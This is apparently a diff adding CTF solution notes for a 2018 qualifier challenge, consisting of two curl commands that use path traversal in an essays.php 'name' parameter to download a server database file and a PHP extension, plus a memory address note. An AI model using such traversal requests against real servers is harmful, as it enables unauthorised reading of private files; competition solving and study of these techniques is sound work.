@@ -1,0 +1,6 @@
+curl 'http://d4a386ad.quals2018.oooverflow.io/essays.php?preview&name=../../../../../var/lib/mydb/mydb.db' -H 'Connection: keep-alive' -H 'Pragma: no-cache' -H 'Cache-Control: no-cache' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: en-US,en;q=0.9,ro;q=0.8' -H 'Cookie: PHPSESSID=1hl9e3st1o30nqisgif4eaoup6' --compressed -o mydb.db
+
+curl 'http://d4a386ad.quals2018.oooverflow.io/essays.php?preview&name=../../../../../usr/lib/php/20151012/mydb.so' -H 'Connection: keep-alive' -H 'Pragma: no-cache' -H 'Cache-Control: no-cache' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: en-US,en;q=0.9,ro;q=0.8' -H 'Cookie: PHPSESSID=1hl9e3st1o30nqisgif4eaoup6' --compressed -o mydb.so
+
+
+0x7fffee502f08 - hash function
